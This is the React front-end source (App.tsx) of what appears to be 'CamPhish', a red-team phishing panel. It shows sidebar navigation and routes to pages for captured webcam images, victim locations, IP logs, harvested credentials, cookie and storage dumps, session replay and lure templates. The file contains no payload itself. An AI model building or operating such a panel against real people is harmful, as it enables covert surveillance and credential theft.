import { useEffect, useState } from 'react'
import { Routes, Route, NavLink, Navigate, useLocation } from 'react-router-dom'
import { ThemeProvider, useTheme } from './theme'
import { initPostHog, capturePageView } from './posthog'
import Dashboard from './pages/Dashboard'
import Captures from './pages/Captures'
import Locations from './pages/Locations'
import IpLogs from './pages/IpLogs'
import SessionReplay from './pages/SessionReplay'
import Templates from './pages/Templates'
import Sessions from './pages/Sessions'
import Credentials from './pages/Credentials'
import StorageDumps from './pages/StorageDumps'

const navItems = [
  { to: '/', label: 'Dashboard', icon: '📊' },
  { to: '/captures', label: 'Captures', icon: '📷' },
  { to: '/locations', label: 'Locations', icon: '📍' },
  { to: '/ips', label: 'IP Logs', icon: '🌐' },
  { to: '/credentials', label: 'Credentials', icon: '🔑' },
  { to: '/storage', label: 'Storage', icon: '🍪' },
  { to: '/replay', label: 'Replay', icon: '⚡' },
  { to: '/templates', label: 'Templates', icon: '🎭' },
  { to: '/sessions', label: 'Sessions', icon: '🗂' },
]

function AuthBadge({ sidebarOpen }: { sidebarOpen: boolean }) {
  const [apiKey, setApiKey] = useState(() => localStorage.getItem('camphish-api-key'))
  const [bearer, setBearer] = useState(() => localStorage.getItem('camphish-bearer-token'))
  const [hint, setHint] = useState('')

  const hasAuth = apiKey || bearer
  const label = apiKey ? 'API Key' : bearer ? 'OAuth' : 'No M2M auth'
  const icon = apiKey ? '🔑' : bearer ? '🔒' : '⚪'

  return (
    <div className={`${hasAuth ? 'block' : 'hidden'} md:block`}>
      <button
        onClick={() => {
          localStorage.removeItem('camphish-api-key')
          localStorage.removeItem('camphish-bearer-token')
          setApiKey(null)
          setBearer(null)
          setHint('Cleared. Refresh to use cookie-based login.')
          setTimeout(() => setHint(''), 3000)
        }}
        className="nav-link w-full text-left"
        aria-label="Clear stored API key or OAuth token"
      >
        <span>{icon}</span>
        <span className={`${sidebarOpen ? 'inline' : 'hidden'} md:inline`}>{label}</span>
      </button>
      {hint && (
        <p className="text-[9px] text-tertiary px-2 mt-0.5">{hint}</p>
      )}
    </div>
  )
}

function CodeBadge() {
  const params = new URLSearchParams(window.location.search)
  const code = params.get('code')
  if (!code) return null
  return (
    <div className="hidden md:flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[11px]"
      style={{ backgroundColor: 'color-mix(in srgb, var(--accent) 15%, transparent)', color: 'var(--accent)' }}>
      <span>🔑</span>
      <code className="tracking-wider font-mono">{code}</code>
      <button onClick={() => navigator.clipboard.writeText(code!)}
        className="ml-auto text-[10px] opacity-60 hover:opacity-100">📋</button>
    </div>
  )
}

function Layout() {
  const { theme, toggle } = useTheme()
  const location = useLocation()
  const [sidebarOpen, setSidebarOpen] = useState(false)

  useEffect(() => {
    initPostHog()
  }, [])

  useEffect(() => {
    capturePageView()
    setSidebarOpen(false)
  }, [location.pathname])

  return (
    <div className="min-h-screen flex bg-primary">
      <a href="#main-content" className="sr-only focus:not-sr-only focus:absolute focus:top-2 focus:left-2 z-[60] px-3 py-2 rounded bg-tertiary text-primary text-sm font-medium">Skip to content</a>
      {/* Mobile overlay backdrop */}
      {sidebarOpen && (
        <div
          className="fixed inset-0 bg-black/50 z-40 md:hidden"
          onClick={() => setSidebarOpen(false)}
          aria-hidden="true"
        />
      )}
      <aside className={`glass-nav flex flex-col fixed h-full z-50 transition-all duration-200 ${sidebarOpen ? 'w-56' : 'w-14'} md:w-56 md:translate-x-0`}>
        <div className="p-3 md:p-4 border-b border-subtle flex items-center gap-2.5">
          <span className="text-lg select-none">🎯</span>
          <div className="hidden md:block leading-tight">
            <h1 className="text-sm font-semibold accent">CamPhish</h1>
            <p className="text-[10px] text-tertiary">v2.1 · Red Team</p>
          </div>
        </div>
        <nav className="flex-1 p-1.5 space-y-0.5 overflow-y-auto">
          {navItems.map(item => (
            <NavLink
              key={item.to}
              to={item.to}
              end={item.to === '/'}
              className={({ isActive }) =>
                `nav-link ${isActive ? 'active' : ''}`
              }
            >
              <span className="text-base">{item.icon}</span>
              <span className={`${sidebarOpen ? 'inline' : 'hidden'} md:inline`}>{item.label}</span>
            </NavLink>
          ))}
        </nav>
        <div className="p-2 border-t border-subtle space-y-1">
          <CodeBadge />
          <AuthBadge sidebarOpen={sidebarOpen} />
          <div className={`${sidebarOpen ? 'block' : 'hidden'} md:block space-y-0.5`}>
            <a href="/t/face-runner" target="_blank" rel="noreferrer" className="nav-link">
              <span>🎮</span> <span className={`${sidebarOpen ? 'inline' : 'hidden'} md:inline`}>Game</span>
            </a>
            {import.meta.env.VITE_TRAILBASE_URL && (
              <a href={(import.meta.env.VITE_TRAILBASE_URL || '').replace(/\/+$/, '') + '/_/admin/'} target="_blank" rel="noreferrer" className="nav-link">
                <span>🗄</span> <span className={`${sidebarOpen ? 'inline' : 'hidden'} md:inline`}>TrailBase</span>
              </a>
            )}
            <button onClick={() => { toggle(); setSidebarOpen(false) }} className="nav-link w-full text-left">
              <span>{theme === 'terminal' ? '💻' : '🌙'}</span>
              <span className={`${sidebarOpen ? 'inline' : 'hidden'} md:inline`}>{theme === 'terminal' ? 'Midnight' : 'Terminal'}</span>
            </button>
          </div>
          {/* Mobile hamburger toggle */}
          <button
            onClick={() => setSidebarOpen(!sidebarOpen)}
            className="nav-link w-full text-left md:hidden"
            aria-label={sidebarOpen ? 'Collapse menu' : 'Expand menu'}
          >
            <span>{sidebarOpen ? '◀' : '▶'}</span>
            <span className={`${sidebarOpen ? 'inline' : 'hidden'}`}>{sidebarOpen ? 'Collapse' : 'Menu'}</span>
          </button>
        </div>
      </aside>
      <main id="main-content" className="flex-1 overflow-auto ml-14 md:ml-56 p-4 md:p-5">
        {/* Mobile page title bar */}
        <div className="flex items-center gap-2 mb-3 md:hidden">
          <button
            onClick={() => setSidebarOpen(!sidebarOpen)}
            className="p-1.5 rounded radius-sm text-tertiary hover:text-secondary"
            aria-label="Toggle menu"
          >
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="18" x2="20" y2="18"/></svg>
          </button>
          <span className="text-sm font-semibold accent">CamPhish</span>
        </div>
        <Routes>
          <Route path="/" element={<Dashboard />} />
          <Route path="/captures" element={<Captures />} />
          <Route path="/locations" element={<Locations />} />
          <Route path="/ips" element={<IpLogs />} />
          <Route path="/credentials" element={<Credentials />} />
          <Route path="/storage" element={<StorageDumps />} />
          <Route path="/replay" element={<SessionReplay />} />
          <Route path="/templates" element={<Templates />} />
          <Route path="/sessions" element={<Sessions />} />
          <Route path="*" element={<Navigate to="/" replace />} />
        </Routes>
      </main>
    </div>
  )
}

export default function App() {
  return (
    <ThemeProvider>
      <Layout />
    </ThemeProvider>
  )
}
